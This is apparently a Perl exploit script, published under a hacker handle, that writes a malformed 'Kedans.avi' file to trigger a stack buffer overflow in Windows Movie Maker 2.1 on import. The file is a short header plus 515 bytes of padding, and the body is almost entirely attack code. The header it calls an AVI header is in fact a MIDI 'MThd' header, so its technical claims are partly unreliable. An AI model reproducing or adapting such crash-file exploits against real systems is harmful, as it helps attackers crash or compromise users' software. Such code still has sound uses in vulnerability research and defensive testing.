#!/usr/bin/perl

###
# Title : Windows Movie Maker 2.1 (Import AVI video) Stack Overflow
# Author : KedAns-Dz
# E-mail : ked-h@hotmail.com
# Home : HMD/AM (30008/04300) - Algeria -(00213555248701)
# Twitter page : twitter.com/kedans
# platform : Windows 
# Impact : Stack Overflow in 'moviemk.exe' Process
# Tested on : Windows XP SP3 Fran?ais 
# Target : Windows Movie Maker 2.1.4026
###
# Note : BAC 2011 Enchallah ( KedAns 'me' & BadR0 & Dr.Ride & Red1One & XoreR & Fox-Dz ... all )
# ------------
# Usage : 1 - Creat AVI file
#    =>    2 - Impoter AVI file in WMM 2.1
#     =>    3 -  OverFlow !!!
# Assembly Errur : {
# [div] exa ,ecx ; 0x74872224 "\xf7\xf1"
# [int] ; 0x41 * 515 bytes
# }
# ------------
#START SYSTEM /root@MSdos/ :
system("title KedAns-Dz");
system("color 1e");
system("cls");
print "\n\n";                  
print "    |===========================================================|\n";
print "    |= [!] Name : Windows Movie Maker 2.1 (Import AVI video)   =|\n";
print "    |= [!] Exploit : Stack Buffer Overflow                     =|\n";
print "    |= [!] Author : KedAns-Dz                                  =|\n";
print "    |= [!] Mail: Ked-h(at)hotmail(dot)com                      =|\n";
print "    |===========================================================|\n";
sleep(2);
print "\n";
# Creating ...
my $PoC = "\x4D\x54\x68\x64\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00"; # AVI Header
my $Junk = "\x41" x 515 ; # Junk
open(file , ">", "Kedans.avi"); # Evil Video AVI (529 bytes) 4.0 KB
print file $PoC.$Junk;  
print "\n [+] File successfully created!\n" or die print "\n [-] OpsS! File is Not Created !! ";
close(file);  

#================[ Exploited By KedAns-Dz * HST-Dz * ]=========================
# Greets to : [D] HaCkerS-StreeT-Team [Z] < Algerians HaCkerS >
# Greets to All ALGERIANS EXPLO!TER's & DEVELOPER's :=>
# Ma3sTr0-Dz * Indoushka * MadjiX * BrOx-Dz * JaGo-Dz * His0k4 * Dr.0rYX 
# Cr3w-DZ * El-Kahina * Dz-Girl * SuNHouSe2 ; All Others && All My Friends .
# Special Greets to 3 em EnGineering Electric Class , BACALORIA 2011 Enchallah 
# Messas Secondary School - Ain mlilla - 04300 - Algeria
# hotturks.org : TeX * KadaVra ... all Others
# Kelvin.Xgr ( kelvinx.net)
#===========================================================================
